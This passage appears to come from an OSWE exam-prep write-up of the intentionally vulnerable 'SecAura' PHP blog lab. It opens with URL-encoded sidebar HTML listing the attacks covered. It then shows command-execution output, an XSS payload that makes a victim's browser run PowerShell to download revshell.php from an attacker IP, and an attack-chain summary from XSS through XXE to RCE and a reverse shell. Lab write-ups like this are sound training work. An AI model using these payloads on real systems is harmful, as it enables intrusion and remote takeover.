%20%20%20%3C!--%20Categories%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3EAttacks%20Covered%20%3A)%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EXSS%20(Cross%20Site%20Scripting)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ESession%20riding(XSS)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EXXE%20(XML%20external%20Entity)%20Injection%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ELFI%20(Local%20File%20Inclusion)%20via%20XXE%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ERCE%20(Remote%20Code%20Execution)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EReverse%20Shelling%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Categories%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3ELanguages%20Covered%20%3A)%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22row%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EPHP%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ESQL%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EJavaScript%20%2B%20XHR%20(XML%20HTTP%20Requests)%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22col-sm-6%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cul%20class%3D%22list-unstyled%20mb-0%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EPython%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3EXML%3C%2Fa%3E%3C%2Fli%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20%3Cli%3E%3Ca%20href%3D%22%23!%22%3ETutorials%3C%2Fa%3E%3C%2Fli%3E%20--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Ful%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C!--%20Side%20widget--%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card%20mb-4%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-header%22%3ELike%20and%20subscribe%20please%20%3A)%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22card-body%22%3EThis%20website%20is%20being%20used%20as%20a%20proof%20of%20concept%20to%20teach%20the%20developement%20side%20of%20a%20basic%20PHP%20web%20app%20and%20attacks%20for%20the%20support%20of%20the%20%3Ca%20href%3D%22https%3A%2F%2Fwww.offensive-security.com%2Fawae-oswe%2F%22%3EOSWE%3Ca%3E(offensive%20security%20web%20expert)%20exam%20by%20%3Cb%3ESecAura%3C%2Fb%3E%20%3A)%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Footer--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cfooter%20class%3D%22py-5%20bg-dark%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22container%22%3E%3Cp%20class%3D%22m-0%20text-center%20text-white%22%3ECopyright%20%26copy%3B%20Your%20Website%202021%3C%2Fp%3E%3C%2Fdiv%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2Ffooter%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Bootstrap%20core%20JS--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fnpm%2Fbootstrap%405.1.3%2Fdist%2Fjs%2Fbootstrap.bundle.min.js%22%3E%3C%2Fscript%3E%0D%0A%20%20%20%20%20%20%20%20%3C!--%20Core%20theme%20JS--%3E%0D%0A%20%20%20%20%20%20%20%20%3Cscript%20src%3D%22js%2Fscripts.js%22%3E%3C%2Fscript%3E%0D%0A%20%20%20%20%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%3C!--%20contains%20the%20footer.php%20code%20(cleaner%20code)%20--%3E%0D%0A HTTP/1.1" 404 -

```

Inspecting the result, we observed that the result of our command execution appeard in the response body:
```
upload error<br><pre>uid=197609(someuser) gid=197609(someuser) groups=197609(someuser),401408(Medium Mandatory Level),197611(docker-users),578(Hyper-V Administrators),545(Users),4(INTERACTIVE),66049(CONSOLE LOGON),11(Authenticated Users),15(This Organization),68542(MicrosoftAccount+someuser@gmail.com),113(Local account),4095(CurrentSession),66048(LOCAL),262180(Cloud Account Authentication)
</pre> 
```

## Phase 6: XSS Reverse Shell 
Using our discovered XSS, a payload like this:
```javascript
"><script src=http://localhost/secaura/upload.php?debugcommandLineParameter=powershell%20-c%20invoke-webrequest%20-Uri%20http://192.168.32.133/revshell.php%20-OutFile%20revshell.php&debugcommandSecret=Subscribe2SecAura:)></script>
```
Will make the victim's browser invoke a web request downloading the reverse shell file hosted on the attacker's server to the target machine, then the attacker triggers the reverse shell visiting:
```
/secaura/revshell.php
```

Reverse shell PHP script: [revshell.php](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/SecAura%20Blog/revshell.php) 

**Automation Python Script:** [revshell_script.py](https://github.com/0xNayel/OSWE-AWAE-Notes/blob/main/Machines/SecAura%20Blog/revshell_script.py) 

## Attack Chain Summary

1. **XSS Discovery**: Stored XSS in comment functionality
2. **Access Control Bypass**: Leveraged XSS to bypass localhost-only admin restrictions
3. **XXE Discovery**: Found XML upload functionality vulnerable to XXE injection
4. **File System Access**: Used XXE to read local files via PHP filters
5. **Code Discovery**: Discovered hidden RCE functionality in upload.php
6. **Remote Code Execution**: Achieved full system compromise
7. **Reverse Shell:** Gain a reverse shell 

